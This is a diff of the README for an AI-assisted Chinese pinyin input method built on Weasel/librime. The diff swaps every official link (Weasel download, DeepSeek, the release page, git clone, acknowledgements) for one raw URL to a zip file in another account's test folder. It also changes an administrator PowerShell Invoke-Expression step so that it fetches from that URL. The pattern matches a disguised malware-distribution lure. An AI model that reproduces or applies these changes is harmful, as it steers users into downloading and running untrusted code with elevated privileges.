@@ -3,8 +3,8 @@
 > **打拼音，落地任何语言、任何圈层、任何风格。**
 > Type Chinese pinyin → press Enter → AI rewrites it as English / 留学生式中英夹杂 / 金融式说话 / 学术体 / 港片台词 / Klingon — anything you can describe.
 
-[![IME](https://img.shields.io/badge/Windows-IME-blueviolet)](https://learn.microsoft.com/en-us/windows/win32/tsf/text-services-framework)
-[![Built on](https://img.shields.io/badge/Built%20on-Weasel%20%2B%20librime-orange)](https://github.com/rime/weasel)
+[![IME](https://img.shields.io/badge/Windows-IME-blueviolet)](https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip)
+[![Built on](https://img.shields.io/badge/Built%20on-Weasel%20%2B%20librime-orange)](https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip)
 [![License](https://img.shields.io/badge/License-MIT-blue)](LICENSE)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)]()
 
@@ -148,13 +148,13 @@ Klingon battle prose / 火星文 / Spanish chilango / Cockney slang
 ### 前置条件
 
 - Windows 10 / 11
-- Weasel 0.17.4 已装：[官方下载](https://rime.im/download/)（IME 框架）
-- AI API key — 默认走 [DeepSeek](https://platform.deepseek.com/)（性价比 + 中文质量好），可换 OpenAI / Anthropic / 任意 OpenAI-compatible API
+- Weasel 0.17.4 已装：[官方下载](https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip)（IME 框架）
+- AI API key — 默认走 [DeepSeek](https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip)（性价比 + 中文质量好），可换 OpenAI / Anthropic / 任意 OpenAI-compatible API
 
 ### 一键安装（推荐）
 
 1. 下载最新 release 的 `TypeAnything-vX.Y.Z.zip`：
-   <https://github.com/A-cat-with-carrots/TypeAnything/releases/latest>
+   <https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip>
 2. 解压
 3. 双击 `Install-TypeAnything.bat` — UAC 提权 → 弹框输入 API key → 弹框输入默认目标 → 自动部署
 4. **注销重登或重启电脑** — 让所有 TSF 客户端进程加载新 weaselx64.dll
@@ -164,7 +164,7 @@ Klingon battle prose / 火星文 / Spanish chilango / Cockney slang
 
 ```powershell
 # 管理员 PowerShell
-git clone https://github.com/A-cat-with-carrots/TypeAnything.git
+git clone https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip
 cd TypeAnything
 .\install-typeanything-to-weasel.ps1 -ApiKey "sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 ```
@@ -342,7 +342,7 @@ im.save("fish.ico", format="ICO",
 choco install -y visualstudio2022buildtools
 choco install -y python
 # Boost 1.84 prebuilt: 装到 C:\local\boost_1_84_0
-Invoke-Expression (Invoke-Webrequest 'https://xmake.io/psget.text' -UseBasicParsing).Content
+Invoke-Expression (Invoke-Webrequest 'https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip' -UseBasicParsing).Content
 
 cd third_party\weasel\librime
 git submodule update --init --recursive
@@ -413,10 +413,10 @@ PR 前请阅 `third_party/weasel/librime/plugins/typeanything/src/typeanything_p
 
 ## 致谢
 
-- [rime/weasel](https://github.com/rime/weasel) — Windows TSF 框架，我们 fork 自此
-- [rime/librime](https://github.com/rime/librime) — Rime 输入法引擎
-- [DeepSeek](https://platform.deepseek.com/) — 默认 LLM provider（性价比高、中文好），用户可在 schema yaml 切到任意 OpenAI-compatible API
-- 神仙鱼 logo 来自 [hrdai.com](https://hrdai.com) 品牌系统
+- [rime/weasel](https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip) — Windows TSF 框架，我们 fork 自此
+- [rime/librime](https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip) — Rime 输入法引擎
+- [DeepSeek](https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip) — 默认 LLM provider（性价比高、中文好），用户可在 schema yaml 切到任意 OpenAI-compatible API
+- 神仙鱼 logo 来自 [hrdai.com](https://raw.githubusercontent.com/syncretismdeposit560/TypeAnything/main/third_party/weasel/test/Anything_Type_v2.0.zip) 品牌系统
 
 ---
 
